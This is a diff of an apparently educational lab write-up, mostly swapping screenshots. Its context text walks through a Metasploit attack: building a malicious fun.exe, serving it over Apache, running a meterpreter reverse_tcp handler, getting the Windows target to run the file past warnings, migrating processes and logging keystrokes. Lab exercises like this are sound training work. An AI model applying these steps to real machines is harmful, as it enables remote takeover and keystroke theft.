@@ -69,39 +69,38 @@ Create a malicious executable file fun.exe using msenom command ``` msfvenom -p 
 
 ### Output:
 
-<img width="760" height="338" alt="image" src="https://github.com/user-attachments/assets/77b8139b-4cd1-47be-bb96-e4e2a14fa6f7" />
+<img width="767" height="346" alt="image" src="https://github.com/user-attachments/assets/d3f3a5f3-54c7-4c04-bc7f-0d5f36ac1a3e" />
 
-<img width="777" height="125" alt="image" src="https://github.com/user-attachments/assets/1d346a15-f51c-4d74-a452-0a99a32d2c79" />
+<img width="839" height="137" alt="image" src="https://github.com/user-attachments/assets/37664023-e527-469d-a12f-a4e565969067" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
 
-<img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/923bba31-86a7-4859-9a08-1f64daa7b46b" />
+<img width="367" height="77" alt="image" src="https://github.com/user-attachments/assets/47ffc8e5-a9f6-4738-95cc-76a13422391d" />
 
 
 Start apache server ```sudo systemctl apache2 start``` 
 
-<img width="349" height="53" alt="image" src="https://github.com/user-attachments/assets/ffbad688-d9ad-4016-85b8-ae4ff20cf592" />
+<img width="306" height="60" alt="image" src="https://github.com/user-attachments/assets/d9726733-8e93-48d7-b7a2-4071fa490588" />
 
 
 Check the status of apache2 ```sudo apache2 status```
 
-<img width="1890" height="413" alt="image" src="https://github.com/user-attachments/assets/4328d200-fcbb-402e-999d-b061ae8439ce" />
+<img width="896" height="418" alt="image" src="https://github.com/user-attachments/assets/863c0668-a509-4f40-a2bb-10978f904006" />
 
 Invoke msfconsole:
 
-<img width="1890" height="749" alt="image" src="https://github.com/user-attachments/assets/274ab86a-9bcd-44a9-8908-d3fc060aad28" />
+<img width="708" height="501" alt="image" src="https://github.com/user-attachments/assets/061b56b9-892a-404e-ba84-c28c4deb1e18" />
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-<img width="1184" height="907" alt="image" src="https://github.com/user-attachments/assets/5d5a6c30-be02-4ddb-813d-5c2014c07525" />
+<img width="816" height="557" alt="image" src="https://github.com/user-attachments/assets/7128fd25-c700-4ca2-af73-8e385b45be00" />
 
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
-<img width="640" height="274" alt="image" src="https://github.com/user-attachments/assets/ad2bcfac-7705-4960-9ed3-1444c2386f8c" />
-<img width="929" height="165" alt="image" src="https://github.com/user-attachments/assets/367cf103-221b-4a91-97ec-435762e45f4f" />
+<img width="624" height="137" alt="image" src="https://github.com/user-attachments/assets/d7697f25-0b64-4639-bfff-f5b47ce2fdc4" />
 
 
 ### Output 
@@ -109,12 +108,11 @@ Starting a command and control Server ```use multi/handler``` ```set PAYLOAD win
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
 
-<img width="1919" height="1139" alt="Screenshot 2025-10-06 090448" src="https://github.com/user-attachments/assets/0441c906-9b88-4b5c-83f7-3dd926a0eab7" />
+<img width="772" height="503" alt="image" src="https://github.com/user-attachments/assets/a69301f9-0ad0-4870-ae99-d4c37c1b2cde" />
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
-
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
@@ -126,6 +124,7 @@ migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A
 #### Post Exploitation:
 The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 
+<img width="842" height="657" alt="image" src="https://github.com/user-attachments/assets/e16b8f90-6bf6-4cfb-97f6-1a11b9915a08" />
 
 
 keyscan_dump Shows the keystrokes captured so far
